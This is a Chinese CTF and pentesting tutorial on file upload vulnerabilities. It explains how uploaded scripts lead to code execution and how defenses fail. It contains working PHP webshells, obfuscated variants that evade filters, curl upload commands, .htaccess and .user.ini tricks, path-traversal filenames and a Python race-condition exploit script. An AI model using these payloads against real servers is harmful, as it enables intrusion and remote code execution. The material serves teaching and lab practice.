# 文件上传漏洞


---

## 一、场景：哪些入口存在文件上传风险

### 1.1 文件上传漏洞的本质

文件上传漏洞不是"能传文件"就是漏洞，而是服务器对上传的文件名、类型、内容校验不严，导致你传的脚本被解析执行。

**从上传到 RCE 的完整条件链：**

```
上传成功
    ↓
知道/猜到文件保存路径
    ↓
文件位于 Web 可访问目录
    ↓
文件被脚本引擎解析执行
    ↓
Web 进程有对应执行权限
```

其中任意一步不成立，都可能只能得到"文件存储"，不能得到 RCE。

### 1.2 文件上传的常见危害

| 危害类型 | 典型场景 | 触发条件 |
|:---------|:---------|:---------|
| 远程代码执行 | 上传 PHP/JSP/ASP 并被解析 | 后缀 + 目录解析 + 可访问 |
| 存储型 XSS | SVG/HTML 上传后由管理员访问 | 同源展示、无 CSP |
| XXE | SVG/XML/Office 上传后被解析 | XML 解析器未禁用外部实体 |
| 任意文件覆盖 | 文件名未随机化，覆盖配置或模板 | 保存路径可预测 |
| 路径穿越写文件 | 文件名含 `../` | 直接拼接客户端文件名 |
| Zip Slip | 压缩包解压时路径穿越 | 解压库未检查 `../` |
| 拒绝服务 | 超大文件/压缩炸弹/超大图片 | 未限制大小和尺寸 |
| 信息泄露 | 错误信息暴露真实路径 | 调试信息未关闭 |
| 组合利用 | 图片马 + LFI / phar + 反序列化 | 存在其他漏洞配合 |

### 1.3 做题时的五个核心问题

面对一个文件上传功能，先回答下面五个问题：

**问题1：检测发生在哪里？**
- 前端（无 HTTP 请求） → 绕过前端，进问题2
- 后端（请求被拒绝） → 进问题2

**问题2：后端检查什么？**
- Content-Type → 修改文件块内部 MIME
- 后缀黑名单 → 遗漏后缀/大小写/双写/截断
- 后缀白名单 → 转问题3，不再找危险后缀
- 文件头/图片结构 → 图片马/二次编码判断
- 多重组合检查 → 分层绕过

**问题3：文件保存路径是否可控？**
- 固定 Web 目录 → 进问题4
- 路径参数可控 → 路径穿越写任意目录
- 非 Web 目录 → 配合文件包含/其他读取方式

**问题4：上传目录会解析脚本吗？**
- 解析 → 直接访问 Webshell
- 不解析 → 配置文件/解析差异/文件包含
- 不确定 → 上传探测文件验证

**问题5：能与其他漏洞组合利用吗？**
- 存在文件包含 → 图片马 + LFI
- 存在反序列化 → phar:// 触发
- 存在 XSS → SVG/HTML 上传
- 存在 XXE → SVG/XML/Office 上传

文件上传漏洞不限于"上传头像"这一个场景。CTF 和渗透测试中常见的上传入口包括：

1. 用户头像 / 个人资料图片
2. 文章封面、相册、富文本编辑器图片
3. 文件附件（文档、压缩包、PDF）
4. 主题、插件、模板在线安装
5. 数据导入 / 备份恢复 / 批量导入
6. SVG 图标 / XML 配置文件上传
7. Markdown 编辑器图片上传
8. 数据集、模型文件导入
9. API 文档中的隐藏上传接口

有些页面上没有显式的 `<input type="file">`，但前端 JS 中可能存在隐藏上传接口：

```javascript
fetch('/api/upload', { method: 'POST', body: formData });
```

因此检查前端源码、网络请求和 API 文档是第一步。

## 二、原理：文件上传漏洞为什么会发生

### 2.1 正常上传流程

一个典型的 PHP 文件上传流程：

```
浏览器选择文件
    ↓
发送 multipart/form-data 请求
    ↓
Web 服务器接收请求
    ↓
PHP 把文件暂存到临时目录（/tmp/phpXXXXXX）
    ↓
后端读取 $_FILES 检查文件
    ↓
move_uploaded_file() 移动到目标目录
    ↓
数据库记录文件路径
    ↓
用户访问或下载文件
```

PHP 中接收到的上传信息：

```php
$_FILES['file']['name']      // 原始文件名（来自客户端，**不可信**）
$_FILES['file']['type']      // Content-Type（来自客户端，**不可信**）
$_FILES['file']['tmp_name']  // 临时文件路径（由 PHP 生成，可信）
$_FILES['file']['error']     // 错误码（0 = UPLOAD_ERR_OK）
$_FILES['file']['size']      // 文件大小（字节）
```

**关键认知：`name` 和 `type` 均由客户端提交，可在 BurpSuite 中任意修改，不能单独作为安全判断依据。**

### 2.2 漏洞产生的根本原因

文件上传漏洞的核心不是"网站允许上传文件"，而是服务器接收文件后，对以下环节处理不当：

| 环节 | 不安全做法 | 安全做法 |
|:-----|:-----------|:---------|
| 文件名 | 直接使用客户端文件名 | 服务端生成随机文件名 |
| 文件后缀 | 黑名单过滤 | 白名单 + 禁用目录执行 |
| 文件内容 | 只检查 Content-Type | 服务端检测真实 MIME |
| 保存路径 | 拼接在 Web 目录下 | 存储到 Web 根目录外 |
| 后续处理 | 直接 HTTP 访问 | 通过下载接口读取 |

### 2.3 漏洞利用的完整条件链

上传一个 PHP 文件不等于已经获得代码执行。从上传到 RCE 需要满足以下条件：

```
上传成功
    ↓
知道/猜到文件保存路径
    ↓
文件位于 Web 可访问目录
    ↓
文件被脚本引擎解析执行
    ↓
Web 进程有对应执行权限
```

其中任意一步不成立，都可能只能得到"文件存储"，不能得到 RCE。

** 新手避坑 3：** 上传成功 ≠ RCE。HTTP 200 可能只是上传成功页面的返回值。先上传纯文本探测文件，确认文件可访问且被 PHP 解析后，再使用真正的 webshell。

### 2.4 multipart/form-data 请求结构

```http
POST /upload.php HTTP/1.1
Host: target.example
Content-Type: multipart/form-data; boundary=----WebKitBoundary123
Cookie: PHPSESSID=abcdef

------WebKitBoundary123
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

[文件内容]
------WebKitBoundary123
Content-Disposition: form-data; name="submit"

upload
------WebKitBoundary123--
```

需要重点关注的位置：

| 位置 | 示例 | 是否可控 | 绕过意义 |
|:-----|:------|:--------:|:---------|
| 最外层 Content-Type | `multipart/form-data; boundary=...` | 需和 body 一致 | 一般不改 |
| 表单字段名 | `name="file"` | **可改** | 需和后端对应 |
| **文件名** | `filename="avatar.jpg"` | **完全可控** | 改变保存后缀 |
| **文件块内部 MIME** | `Content-Type: image/jpeg` | **完全可控** | 绕过 MIME 检查 |
| **文件内容** | 二进制/文本数据 | **完全可控** | 写入 webshell |
| 其他参数 | `submit=upload` | 可改 | 影响业务逻辑 |
| Cookie/Token | `PHPSESSID=...` | 可能需要 | 身份认证 |

** 新手避坑 4：** 修改的是**文件块内部的 `Content-Type`**（跟在 `Content-Disposition` 后面的），不是最外层带 boundary 的请求头 `Content-Type`。初学者最常见的错误就是改错了位置。

### 2.4 常见危害全景

| 危害类型 | 典型场景 | 触发条件 |
|----------|----------|----------|
| 远程代码执行 | 上传 PHP/JSP/ASP 并被解析 | 后缀+目录解析+可访问 |
| 存储型 XSS | SVG/HTML 上传后由管理员访问 | 同源展示、无 CSP |
| XXE | SVG/XML/Office 上传后被解析 | XML 解析器未禁用外部实体 |
| 任意文件覆盖 | 文件名未随机化，覆盖配置或模板 | 保存路径可预测 |
| 路径穿越写文件 | 文件名含 `../` | 直接拼接客户端文件名 |
| Zip Slip | 压缩包解压时路径穿越 | 解压库未检查 `../` |
| 拒绝服务 | 超大文件/压缩炸弹/超大图片 | 未限制大小和尺寸 |
| 信息泄露 | 错误信息暴露真实路径 | 调试信息未关闭 |
| 组合利用 | 图片马 + LFI / phar + 反序列化 | 存在其他漏洞配合 |

### 2.5 Webshell 基础与探测

**PHP 常见 Webshell：**

```php
<?php system($_GET['cmd']); ?>                    // GET 命令执行
<?php @eval($_POST['cmd']); ?>                    // POST 代码执行
<?= file_get_contents('/flag'); ?>                 // 直接读文件（短标签）
<?php echo file_get_contents('/flag'); ?>          // 读文件
<?php system('cat /flag'); ?>                      // 系统命令
<?php passthru('id'); ?>                           // 直接输出原始结果
```

**最小化探测文件（推荐优先使用）：**

```php
<?php echo "UPLOAD_TEST_7f3a"; ?>
```

- 页面显示 `UPLOAD_TEST_7f3a` → PHP 解析成功
- 下载文件或显示源码 → 没有 PHP 解析

**常用函数区别：**

| 函数 | 参数类型 | 触发条件 |
|:-----|:--------|:---------|
| `system()` | 系统命令 | 直接输出结果 |
| `exec()` | 系统命令 | 需额外获取返回数组 |
| `shell_exec()` | 系统命令 | 返回完整字符串 |
| `eval()` | PHP 代码 | 执行任意 PHP 代码 |
| `file_get_contents()` | 文件路径 | 返回文件内容 |

**各环境脚本后缀：**

| 环境 | 常见后缀 | 说明 |
|:-----|:---------|:-----|
| PHP | `.php` `.phtml` `.php5` `.phar` `.pht` | 是否解析取决于配置 |
| Classic ASP | `.asp` `.asa` `.cer` | IIS |
| ASP.NET | `.aspx` `.ashx` `.asmx` | IIS |
| Java | `.jsp` `.jspx` `.jsw` | Tomcat/Jetty |
| CGI | `.cgi` `.pl` `.py` | 需 CGI 配置 |

**上传成功后的基础命令：**

```bash
# Linux
id && whoami && pwd && ls -la /
cat /flag /flag.txt
find / -maxdepth 3 -iname '*flag*' 2>/dev/null
printenv

# Windows
whoami && cd && dir
type C:\flag.txt
Get-ChildItem C:\ -Filter *flag* -Recurse -ErrorAction SilentlyContinue
```

** 新手避坑 6：** 不能因为某个后缀"理论上属于脚本"就认为目标一定会解析。`.phps` 在部分 Apache 配置中用于显示源码，不是执行。`.php5` 是否执行取决于 PHP 和 Web 服务器配置。上传后务必访问验证。

** 新手避坑 7：** `eval()` 接收的是 PHP 代码，不是系统命令。`eval("id")` 会报错，应该写 `eval("system('id');")`。CTF 中常见的混淆是把 `eval()` 和 `system()` 弄混。

## 三、实战：前端检查绕过

### 3.1 典型前端校验代码

```javascript
const file = document.querySelector('#file').files[0];
const ext = file.name.split('.').pop().toLowerCase();
if (!['jpg', 'png', 'gif'].includes(ext)) {
    alert('只允许上传图片');
    return false;
}
```

前端校验运行在攻击者自己的浏览器中，可被完全控制。

### 3.2 绕过方法

| 方法 | 操作 | 适用场景 |
|------|------|----------|
| BurpSuite 改包 | 本地改名为 `shell.jpg` 通过校验，抓包改回 `shell.php` | 最通用 |
| 禁用 JavaScript | 浏览器设置或开发者工具禁用 JS | 前端校验依赖 JS |
| 删除 accept 属性 | 删除 `<input accept=".jpg,.png">` | HTML 属性限制 |
| 删除事件监听 | 删除 `onsubmit`、`onchange` 事件 | 事件触发校验 |
| curl 直接发送 | 绕过浏览器直接构造请求 | 完全绕过前端 |

### 3.3 curl 上传示例

```bash
# 最简单的上传
curl -i -F "file=@avatar.jpg" http://target.example/upload.php

# 自定义文件名和 MIME 类型
curl -i \
  -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
  http://target.example/upload.php

# 带 Cookie 和额外字段
curl -i \
  -b "PHPSESSID=abc123" \
  -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
  -F "submit=upload" \
  http://target.example/upload.php

# 查看响应头
curl -v \
  -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
  http://target.example/upload.php 2>&1

# 带 Referer 和 User-Agent（模拟浏览器）
curl -i \
  -A "Mozilla/5.0 ..." \
  -e "http://target.example/upload.html" \
  -F "file=@shell.php;filename=shell.php;type=image/jpeg" \
  http://target.example/upload.php
```

**避坑：** 绕过前端后，后端可能还有验证。curl 拿到响应后，务必再访问文件确认是否被解析。

## 四、实战：后端验证绕过

### 4.1 后端验证类型与绕过总表

| 检测类型 | 绕过方式 | 请求修改示例 | 适用条件 |
|----------|----------|-------------|----------|
| Content-Type 检测 | 修改文件块内部 MIME | `Content-Type: image/jpeg` | 后端只信任 `$_FILES['file']['type']` |
| 黑名单后缀 | 遗漏后缀 | `.phtml` `.php5` `.php7` `.shtml` | 黑名单未覆盖 |
| 黑名单后缀 | 大小写绕过 | `.PHP` `.Php` `.pHp` | 后端区分大小写，文件系统不区分 |
| 黑名单后缀 | 双写绕过 | `.pphphp` → 过滤后变为 `.php` | 只做一次 `str_replace` |
| 黑名单后缀 | 双后缀 | `.php.jpg` | Apache 多后缀解析配置 |
| 黑名单后缀 | Windows 尾部点号 | `shell.php.` `shell.php. .` | Windows + 应用层/文件系统规范不一致 |
| 黑名单后缀 | NTFS ADS | `shell.php::$DATA` | Windows NTFS |
| 黑名单后缀 | %00 截断 | `shell.php%00.jpg` | PHP < 5.3.4 |
| 黑名单后缀 | 文件名长度截断 | `[46个A].php.jpg` → 截断后为 `.php` | 先校验后缀后截断文件名 |
| 白名单后缀 | 上传配置文件 | `.htaccess` `.user.ini` `web.config` | 允许上传并生效 |
| 白名单后缀 | 图片马 + LFI | 图片尾部追加 PHP 代码 | 存在文件包含漏洞 |
| 白名单后缀 | 解析差异 | `avatar.jpg/test.php` PATH_INFO | Nginx + PHP-FPM 配置错误 |
| 白名单后缀 | 路径穿越 | `filename="../shell.php"` | 直接拼接客户端文件名 |
| 文件头检测 | 文件头伪造 | `GIF89a` + PHP 代码 | 只检查前几个字节 |
| getimagesize() | 真实图片追加代码 | `cat cover.jpg shell.php > avatar.jpg` | 函数只判断是否像图片 |
| 图片重新编码 | 无法绕过（代码被丢弃） | — | 换利用链，不依赖图片马 |
| 关键字内容过滤 | 短标签 / 编码绕过 | `<?= system('ls');?>` | 关键字黑名单未覆盖 |
| 条件竞争 | 先保存后删除的窗口期 | 并发上传 + 并发访问 | 文件落盘后才检查内容 |

### 4.2 Content-Type 检测绕过

不安全的后端直接信任客户端提交的 `Content-Type`：

```php
if ($_FILES['file']['type'] !== 'image/jpeg') {
    die('只允许 JPG');
}
```

原始请求中文件块的内容：

```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php
```

修改为：

```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

**注意：** 修改的是 **文件块内部的 `Content-Type`**，不是最外层带 boundary 的请求头。

常见 MIME 类型参考：

| 文件类型 | MIME |
|----------|------|
| JPG | `image/jpeg` |
| PNG | `image/png` |
| GIF | `image/gif` |
| SVG | `image/svg+xml` |
| PDF | `application/pdf` |
| ZIP | `application/zip` |
| JSON | `application/json` |
| XML | `application/xml` |

### 4.3 黑名单后缀绕过详解

#### 遗漏后缀

根据技术栈测试不同后缀：

```
PHP:    .php .phtml .php3 .php4 .php5 .php7 .phar .pht .shtml
ASP:    .asp .asa .cdx .cer
ASP.NET:.aspx .ashx .asmx .ascx
JSP:    .jsp .jspx .jsw .jsv .jspf
```

**注意：** 这些后缀是否被解析取决于服务器配置，不能默认全部生效。上传后务必访问验证。

#### 大小写绕过

```text
shell.PHP
shell.Php
shell.pHp
```

条件：后端区分大小写（如 `in_array($ext, ['php', 'phtml'])`），但文件系统/Web 服务器不区分。

#### 双写绕过

后端只做一次替换：

```php
$name = str_ireplace('.php', '', $name);
```

```text
原始：shell.pphphp
第一次替换后：shell.php（中间的 .php 被删，剩下重新组合）
```

如果后端循环过滤或使用白名单，双写无效。

#### Windows 尾部点号和空格

```text
shell.php.
shell.php. .
shell.php[空格]
```

Windows 文件系统在保存时会自动去掉尾部点号和空格，而应用层检查时仍能看到它们。

```text
过滤器看到：shell.php.    → 后缀是 "" 或 " "
文件系统保存：shell.php   → 后缀是 .php
```

**前提：** 目标运行在 Windows。

#### 文件名长度截断

后端先检查后缀，再截断文件名：

```php
// 检查以 .jpg 结尾
if (!str_ends_with($name, '.jpg')) die('只允许 JPG');
// 截断到 50 字节
$name = substr($name, 0, 50);
```

构造：

```text
[46个A].php.jpg
# 检查时以 .jpg 结尾 → 通过
# 截断后 50 字节 → AAAA...AA.php
# 实际保存为 .php
```

计算公式：填充长度 = 截断长度 - `.php` 的长度（4）

### 4.4 白名单绕过与图片马

白名单只允许明确的安全后缀：

```php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
```

白名单比黑名单安全，绕过方向不是找脚本后缀，而是：

1. 保存路径是否可控
2. 能否上传配置文件（`.htaccess` 等）
3. 图片马能否通过文件包含执行
4. 是否存在解析差异或 PATH_INFO
5. 允许的 SVG/XML 格式能否触发 XSS 或 XXE

#### 文件头伪造

```php
GIF89a
<?php system($_GET['cmd']); ?>
```

把 `GIF89a` 作为前 6 字节，后面跟 PHP 代码。保存为 `.gif` 后，如果通过 LFI 包含，PHP 代码会被执行。

#### 真实图片追加代码

```bash
# Linux
printf '%s' '<?php system($_GET["cmd"]); ?>' > shell.php
cat cover.jpg shell.php > payload.jpg

# Windows
copy /b cover.jpg+shell.php payload.jpg
```

```bash
# 验证
file payload.jpg    # 仍被识别为 JPEG
strings payload.jpg | tail -n 5  # 末尾可见 PHP 代码
```

**核心限制：** 图片马直接访问不会执行 PHP，需要满足以下条件之一：
- 文件被保存为 `.php` 后缀
- 上传目录配置了图片后缀交给 PHP 解析
- 通过文件包含漏洞包含该图片
- 存在其他把内容送入 PHP 解释器的路径

#### 图片重新编码的判定

后端可能真正解码图片并重新生成：

```php
$img = @imagecreatefromstring(file_get_contents($tmp));
if ($img === false) die('无效图片');
imagepng($img, '/safe/path/new.png');
```

重新编码后，追加的 PHP 代码会被丢弃。判断方法：

| 观察点 | 说明 |
|--------|------|
| 上传前后文件哈希 | 不同 → 可能经处理 |
| 文件大小显著变化 | 缩小 → 可能被重新编码 |
| 末尾追加内容消失 | 代码被丢弃 |
| 格式统一为 PNG/JPG | 可能经过了 `imagepng()` 或 `imagejpeg()` |
| EXIF 元数据被移除 | 图片被重新生成 |

遇到重新编码时，**不要继续尝试图片马**，应切换利用链。

#### 图片重新编码的绕过思路

虽然重新编码会丢弃追加的代码，但仍可利用一些技巧：

| 绕过思路 | 原理 | 成功率 |
|:---------|:-----|:------:|
| 利用图片库漏洞 | 某些老版本 ImageMagick 有 RCE | 低 |
| EXIF 注入 | EXIF 数据可能被保留 | 中 |
| 利用图片尺寸 | 超大尺寸导致内存溢出拒绝服务 | 低 |
| 利用色板/元数据 | 部分格式会保留自定义色板 | 低 |
| 使用允许的 SVG | SVG 是文本格式，不经过图片重编码 | 中 |

**重要结论**：遇到重新编码，**不要死磕图片马**。应切换利用链到：
1. 配置文件上传（.htaccess / .user.ini）
2. 路径穿越写其他目录
3. 文件包含组合
4. 解析差异绕过（Nginx PATH_INFO）
5. 其他非 RCE 危害（SVG XSS、XXE）

#### 内容关键字过滤绕过技术

后端可能搜索危险关键字：

```php
$blocked = ['<?php', 'eval', 'system', 'exec', 'passthru'];
foreach ($blocked as $word) {
    if (strpos($content, $word) !== false) {
        die('包含危险关键字');
    }
}
```

**绕过方法：**

| 方法 | 示例 | 说明 |
|:-----|:-----|:------|
| 短标签 | `<?= "UPLOAD_OK"; ?>` | PHP 短标签 |
| Base64 解码 | `<?php eval(base64_decode('...')); ?>` | 运行时解码 |
| 字符串拼接 | `<?php $a='sys';$b='tem';$a.$b($_GET['cmd']); ?>` | 分流解析 |
| 十六进制函数名 | `<?php (hex2bin('73797374656d'))($_GET['cmd']); ?>` | 函数名编码 |
| 反引号 | `` <?= `id`; ?> `` | 短标签 + 命令执行 |
| 多行拆分 | 函数名拆多行 | 正则匹配绕过 |
| 动态函数 | `<?php $_GET['f']($_GET['a']); ?>` | 参数控制函数 |
| 注释注入 | `<?php /*<?php*/ system('id'); ?>` | 误导关键字扫描 |
| UTF-16/BOM | UTF-16 BOM 编码 | 编码混淆 |

**短标签与执行函数对照：**

| 短标签/写法 | 等价写法 | 是否执行 |
|:-----------|:---------|:--------:|
| `<?=expr?>` | `<?php echo expr; ?>` | 是 |
| `<? code ?>` | `<?php code ?>` (需 short_open_tag) | 是 |
| `<% code %>` | ASP 风格 (PHP < 7) | 旧版支持 |
| `<script language="php">code</script>` | 旧版 PHP | PHP 7 已移除 |

 **新手避坑**：关键字过滤不是不可绕过的。如果后端只做简单的字符串匹配，多种编码和变形方式可以绕过。但如果后端使用 tokenizer 解析 PHP 结构，绕过难度显著增加。另外，`<?=` 从 PHP 5.4 起始终可用，不依赖 `short_open_tag` 配置。

## 五、实战：配置文件上传

### 5.1 配置文件速查表

| 配置文件 | 环境 | 作用 | 上传条件 | 缓存影响 |
|----------|------|------|----------|----------|
| `.htaccess` | Apache | 目录级配置，修改解析规则 | Apache + `AllowOverride` 开启 | 立即生效 |
| `.user.ini` | PHP CGI/FastCGI | 目录级 PHP 配置 | PHP-FPM 模式 | `user_ini.cache_ttl`=300秒 |
| `web.config` | IIS/ASP.NET | 应用/目录配置 | IIS 允许覆盖 | 立即生效 |

### 5.2 .htaccess 利用（Apache）

```apache
# 让 avatar.jpg 按 PHP 解析
<FilesMatch "^avatar\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

```apache
# 让所有图片按 PHP 解析
<FilesMatch "\.(jpg|png|gif)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

```apache
# 添加 PHP 后缀解析
AddType application/x-httpd-php .jpg
```

**两阶段利用：**

1. 上传 `.htaccess`（包含上述任意规则）
2. 上传同目录下的图片马（如 `avatar.jpg` 含 PHP 代码）
3. 访问图片 → PHP 代码执行

**条件检查：**

- Web 服务器必须是 Apache
- 目录允许 `AllowOverride`，至少包含 `FileInfo` 选项
- 不能通过 CGI/FastCGI 方式上锁
- 上传文件名未被随机化（或规则能匹配新文件名）

### 5.3 .user.ini 利用（PHP-FPM）

```ini
auto_prepend_file=avatar.jpg
```

效果：同目录下每个 PHP 文件执行前，都会先包含 `avatar.jpg`。

```ini
auto_append_file=shell.jpg
```

效果：PHP 文件执行完毕后，包含 `shell.jpg`。

**两阶段利用：**

1. 上传 `.user.ini`（内容：`auto_prepend_file=shell.jpg`）
2. 上传 `shell.jpg`（含 PHP 代码）
3. 访问同目录下任意正常 PHP 文件
4. `shell.jpg` 中的代码自动执行

**注意：** `.user.ini` 有缓存（默认 300 秒），修改后不一定立即生效。Apache mod_php 模式下通常不生效。

### 5.4 web.config 利用（IIS/ASP.NET）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP" path="*.jpg" verb="*"
                 modules="FastCgiModule"
                 scriptProcessor="C:\PHP\php-cgi.exe"
                 resourceType="File" />
        </handlers>
    </system.webServer>
</configuration>
```

让 IIS 把 `.jpg` 交给 PHP 处理。

**依赖条件：**

- IIS 版本和站点配置
- 上传目录属于应用目录
- 服务器上的 PHP 处理器路径（需已知或猜测）

## 六、实战：Web 服务器解析差异

### 6.1 Apache 多后缀解析

部分 Apache 配置会匹配多个后缀中的可识别处理器：

```text
shell.php.jpg
```

如果 `.php` 被 Apache 识别为 PHP Handler，而 `.jpg` 只被视为扩展名，文件可能被 PHP 处理。

**测试方法：** 分别上传 `test.php`、`test.php.jpg`、`test.jpg.php`，观察响应差异。

### 6.2 Nginx PATH_INFO 解析

旧式 Nginx + PHP-FPM 配置可能错误地把以下路径交给 PHP：

```text
/uploads/avatar.jpg/1.php
/uploads/avatar.jpg/.php
```

Nginx 将 `avatar.jpg` 作为脚本路径，`/1.php` 作为 PATH_INFO，PHP-FPM 执行 `avatar.jpg` 中的 PHP 代码。

**安全配置** 会使用 `try_files $uri =404;` 来防止这种解析。

**测试序列：**

```text
/uploads/avatar.jpg           → 正常图片
/uploads/avatar.jpg/test.php  → 可能触发 PATH_INFO
/uploads/avatar.jpg/.php      → 可能触发 PATH_INFO
```

### 6.3 解析差异对照表

| 技巧 | 主要环境 | 关键前提 |
|------|----------|----------|
| `shell.php.jpg` | Apache | 多后缀中 `.php` 仍绑定 Handler |
| `image.jpg/test.php` | Nginx + PHP-FPM | PATH_INFO 被错误传递 |
| `shell.asp;.jpg` | 旧版 IIS | 分号截断解析 |
| 尾部点号/空格 | Windows | 应用与文件系统规范化顺序不一致 |
| `::$DATA` | Windows NTFS | 旧处理链未正确规范化 |

**避坑：** 解析差异是**配置相关**的，不是看到某个服务器名字就一定存在。先用探测文件验证。

#### Apache 多后缀解析详细测试方法

```bash
# 准备探测文件（内容固定，方便判断解析）
echo '<?php echo "PHP_OK"; ?>' > test.php
echo '<?php echo "PHP_OK"; ?>' > test.php.jpg
echo '<?php echo "PHP_OK"; ?>' > test.jpg.php

# 逐个上传并访问
curl -F "file=@test.php" http://target/upload.php
curl http://target/uploads/test.php          # 基线：应返回 PHP_OK

curl -F "file=@test.php.jpg" http://target/upload.php
curl http://target/uploads/test.php.jpg      # 如果返回 PHP_OK → 多后缀解析

curl -F "file=@test.jpg.php" http://target/upload.php
curl http://target/uploads/test.jpg.php      # 如果返回 PHP_OK → 最后一个后缀解析
```

**结果解读：**

| 访问结果 | 含义 |
|:---------|:------|
| 三个都显示 PHP_OK | Apache 将所有 PHP 后缀都解析 |
| 只有 test.php 显示 PHP_OK | 标准的单后缀解析 |
| test.php.jpg 显示 PHP_OK | 多后缀绑定 PHP Handler |
| 全部显示源码或下载 | 上传目录不解析 PHP |

#### IIS 解析差异详细测试

```text
IIS 6.0:
  shell.asp;.jpg     → ASP 解析（分号截断）
  shell.asp/1.jpg    → ASP 解析（目录解析）
  
IIS 7.0-7.5:
  web.config 控制       → handler 映射
  FastCGI 配置         → 取决于 PHP 安装配置

IIS 10:
  默认无已知解析漏洞    → 需结合其他漏洞
```

#### CGI/FastCGI 解析差异

某些配置下，Web 服务器会将非 PHP 文件通过 CGI/FastCGI 传递给 PHP 解释器：

```apache
# Apache + mod_cgi: 让 .cgi 文件执行
AddHandler cgi-script .cgi

# Apache + FastCGI: 让 .fcgi 文件执行
AddHandler fcgid-script .fcgi
```

如果上传目录配置了 CGI 执行权限，`.cgi` 或 `.fcgi` 文件可直接执行：

```bash
#!/usr/bin/php
<?php system('cat /flag'); ?>
```

保存为 `test.cgi`，上传后设置执行权限（如果服务器自动处理）即可执行。

 **新手避坑**：CGI 类型的解析需要服务器明确配置。大部分 CTF 文件上传题不会涉及 CGI 解析，但如果常规 PHP 后缀被拦截，值得测试 `.cgi` 和 `.fcgi` 后缀。

## 七、实战：文件名与路径控制

### 7.1 路径穿越

不安全代码直接拼接客户端文件名：

```php
$target = __DIR__ . '/uploads/' . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $target);
```

```text
filename="../shell.php"          → 写到 uploads 上一级
filename="../../shell.php"       → 再上一级
filename="../../../var/www/html/shell.php"  → 写回 Web 根目录
```

### 7.2 独立路径参数

某些接口有独立目录参数：

```http
Content-Disposition: form-data; name="path"

uploads/avatar.jpg
```

测试目录穿越：

```text
../
../../
/var/www/html/
C:\inetpub\wwwroot\
```

以及 URL 编码变种：

```text
%2e%2e%2f    → ../
..%2f        → ../
%2e%2e%5c    → ..\
```

### 7.3 路径穿越编码绕过速查

| 编码形式 | 解码后 | 适用场景 |
|----------|--------|----------|
| `../` | 上一级 | Linux/Windows |
| `..\` | 上一级 | Windows |
| `%2e%2e%2f` | `../` | 单次 URL 解码 |
| `..%2f` | `../` | 路径参数中被解码 |
| `%252e%252e%252f` | `../` | 两次 URL 解码 |
| `....//` | `../` | 简单过滤 `../` 时 |
| `..;/` | `../` | 某些中间件解析异常 |

### 7.4 任意文件覆盖

如果服务器保留原始文件名，可能覆盖已有文件：

1. 同名上传两次看旧文件是否被替换
2. 能否覆盖其他用户的头像（IDOR）
3. 能否覆盖公开 JS、CSS、模板文件
4. 能否覆盖配置文件、缓存文件
5. 覆盖一个被 `include()` 加载的 PHP 文件 → 代码执行

**避坑：** `basename()` 不是完整防御——它能去掉目录路径，但仍保留攻击者控制的文件名，仍存在同名覆盖、特殊字符等问题。服务器应自己生成随机文件名。

### 7.5 远程 URL 导入中的文件名差异

如果网站通过 URL 导入文件（curl/wget 下载），可能存在校验与落盘不一致：

```text
http://attacker.example/avatar.png?shell.php
```

校验逻辑可能只看到 `/avatar.png`，但下载工具根据查询参数或 `Content-Disposition` 头决定最终文件名。

需要检查：
1. 302 重定向前后是否重新校验
2. `Content-Disposition: filename=` 能否控制落盘文件名
3. 下载后的真实 MIME 是否重新验证
4. 文件名是否经过服务器随机化

## 八、实战：条件竞争上传

### 8.1 漏洞原理

不安全代码先移动文件，再检查内容：

```php
$target = __DIR__ . '/uploads/' . basename($_FILES['file']['name']);
move_uploaded_file($_FILES['file']['tmp_name'], $target);

if (!is_safe_file($target)) {
    unlink($target);  // 文件已落盘，再删除
    die('非法文件');
}
```

从 `move_uploaded_file()` 成功到 `unlink()` 执行之间存在时间窗口。如果窗口内能访问文件，代码就会执行。

### 8.2 手工判断

| 观察点 | 说明 |
|--------|------|
| 非法文件立即拒绝 | 可能在临时目录就检查了，无窗口 |
| 上传后短暂存在 | 可能先保存后检查 |
| 文件名固定 | 可预测，利于并发访问 |
| 多次尝试偶有成功 | 窗口存在但很小 |

### 8.3 Python 并发利用脚本

```python
import threading
import requests
import sys

TARGET = "http://target.example"
UPLOAD_URL = TARGET + "/upload.php"
SHELL_URL = TARGET + "/uploads/race.php"

stop_event = threading.Event()

payload = b"<?php echo file_get_contents('/flag'); ?>"

def upload_worker():
    """持续上传恶意文件"""
    while not stop_event.is_set():
        try:
            files = {"file": ("race.php", payload, "image/jpeg")}
            requests.post(UPLOAD_URL, files=files, timeout=3)
        except requests.RequestException:
            pass

def read_worker():
    """持续访问目标文件，检测成功"""
    while not stop_event.is_set():
        try:
            r = requests.get(SHELL_URL, timeout=3)
            if "flag{" in r.text or "CTF{" in r.text or "FLAG{" in r.text:
                print(f"[+] SUCCESS: {r.text}")
                stop_event.set()
                return
            # 也可能返回非空但不是flag，继续尝试
            if r.status_code == 200 and len(r.text) > 0:
                print(f"[*] Got response (len={len(r.text)}): {r.text[:100]}")
        except requests.RequestException:
            pass

print(f"[*] Starting race attack: {UPLOAD_URL}")
print(f"[*] Target shell: {SHELL_URL}")

threads = []
# 5 个上传线程 + 10 个读取线程
for _ in range(5):
    t = threading.Thread(target=upload_worker, daemon=True)
    threads.append(t)
for _ in range(10):
    t = threading.Thread(target=read_worker, daemon=True)
    threads.append(t)

for t in threads:
    t.start()

# 主线程等待30秒后超时
stop_event.wait(timeout=30)
if not stop_event.is_set():
    print("[-] Timeout, no success")
else:
    print("[+] Race won!")
```

**使用前修改：**
1. 上传字段名（可能是 `file`、`image`、`upload` 等）
2. Session 和 CSRF Token
3. 文件保存路径（`/uploads/` 可能不同）
4. 文件名是否被重命名
5. 成功判断条件（flag 格式可能不同）
6. 线程数量

### 8.4 扩大竞争窗口

| 方法 | 说明 |
|------|------|
| 上传较大文件 | 处理时间更长，窗口更大 |
